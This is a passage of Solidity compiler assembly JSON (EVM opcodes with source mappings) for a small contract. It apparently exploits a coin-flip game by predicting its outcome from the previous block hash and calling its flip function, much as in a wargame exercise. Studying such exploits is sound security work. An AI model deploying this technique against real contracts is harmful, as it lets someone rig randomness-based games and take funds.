									"source": 2
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "25"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "12"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 2,
									"value": "25"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "tag",
									"source": 2,
									"value": "3"
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 915,
									"end": 921,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 964,
									"end": 966,
									"name": "PUSH",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 952,
									"end": 961,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 943,
									"end": 950,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 939,
									"end": 962,
									"name": "SUB",
									"source": 2
								},
								{
									"begin": 935,
									"end": 967,
									"name": "SLT",
									"source": 2
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "ISZERO",
									"source": 2
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 970,
									"end": 1049,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "tag",
									"source": 2,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "tag",
									"source": 2,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 1090,
									"end": 1091,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "29"
								},
								{
									"begin": 1171,
									"end": 1178,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 1162,
									"end": 1168,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 1151,
									"end": 1160,
									"name": "DUP6",
									"source": 2
								},
								{
									"begin": 1147,
									"end": 1169,
									"name": "ADD",
									"source": 2
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 1115,
									"end": 1179,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "tag",
									"source": 2,
									"value": "29"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 1061,
									"end": 1189,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 91,
									"end": 604,
									"name": "tag",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 91,
									"end": 604,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 91,
									"end": 604,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 91,
									"end": 604,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 91,
									"end": 604,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 91,
									"end": 604,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 91,
									"end": 604,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 91,
									"end": 604,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 91,
									"end": 604,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122095598535040f4d928b04f0b5f86d1082bbc27f747f86c751e11a79e9ce98f39664736f6c634300081b0033",
									".code": [
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "987A4E26"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "F32D251D"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 91,
											"end": 604,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 365,
											"end": 602,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 365,
											"end": 602,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 365,
											"end": 602,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 365,
											"end": 602,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 365,
											"end": 602,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 602,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 365,
											"end": 602,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 365,
											"end": 602,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 121,
											"end": 152,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 121,
											"end": 152,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 365,
											"end": 602,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 365,
											"end": 602,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 404,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 458,
											"end": 459,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 443,
											"end": 455,
											"name": "NUMBER",
											"source": 1
										},
										{
											"begin": 443,
											"end": 459,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 443,
											"end": 459,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 443,
											"end": 459,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 443,
											"end": 459,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 443,
											"end": 459,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 443,
											"end": 459,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 443,
											"end": 459,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 433,
											"end": 460,
											"name": "BLOCKHASH",
											"source": 1
										},
										{
											"begin": 425,
											"end": 461,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 425,
											"end": 461,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 404,
											"end": 461,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 404,
											"end": 461,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 472,
											"end": 488,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 504,
											"end": 510,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 504,
											"end": 510,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 491,
											"end": 501,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 491,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 491,
											"end": 510,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 491,
											"end": 510,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 491,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 491,
											"end": 510,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 491,
											"end": 510,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 491,
											"end": 510,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 472,
											"end": 510,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 472,
											"end": 510,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 520,
											"end": 529,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 544,
											"end": 545,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 532,
											"end": 540,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 532,
											"end": 545,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 532,
											"end": 560,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 532,
											"end": 560,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 555,
											"end": 560,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 532,
											"end": 560,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 532,
											"end": 560,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 532,
											"end": 560,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 532,
											"end": 560,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 548,
											"end": 552,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 532,
											"end": 560,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 532,
											"end": 560,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 520,
											"end": 560,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 520,
											"end": 560,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 570,
											"end": 584,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 570,
											"end": 584,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 570,
											"end": 584,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 570,
											"end": 584,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 570,
											"end": 584,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 570,
											"end": 584,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 570,
											"end": 584,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 570,
											"end": 584,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 570,
											"end": 584,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 570,
											"end": 584,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 570,
											"end": 584,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 570,
											"end": 589,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 570,
											"end": 589,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 570,
											"end": 589,
											"name": "PUSH",
											"source": 1,
											"value": "1D263F67"
										},
										{
											"begin": 590,
											"end": 594,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 570,
											"end": 595,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 570,
											"end": 595,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 570,
											"end": 595,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 570,
											"end": 595,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 394,
											"end": 602,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 394,
											"end": 602,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 394,
											"end": 602,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 602,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 121,
											"end": 152,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 121,
											"end": 152,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "tag",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 7,
											"end": 133,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 126,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 77,
											"end": 82,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 73,
											"end": 127,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 62,
											"end": 127,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 62,
											"end": 127,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 7,
											"end": 133,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 7,
											"end": 133,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 139,
											"end": 199,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 139,
											"end": 199,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 167,
											"end": 170,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 188,
											"end": 193,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 181,
											"end": 193,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 181,
											"end": 193,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 139,
											"end": 199,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 139,
											"end": 199,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 139,
											"end": 199,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 139,
											"end": 199,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 205,
											"end": 347,
											"name": "tag",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 205,
											"end": 347,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 255,
											"end": 264,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 288,
											"end": 341,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 306,
											"end": 340,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 315,
											"end": 339,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 333,
											"end": 338,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 315,
											"end": 339,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 315,
											"end": 339,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 315,
											"end": 339,
											"name": "tag",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 315,
											"end": 339,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 306,
											"end": 340,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 306,
											"end": 340,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 306,
											"end": 340,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 306,
											"end": 340,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 288,
											"end": 341,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 288,
											"end": 341,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 288,
											"end": 341,
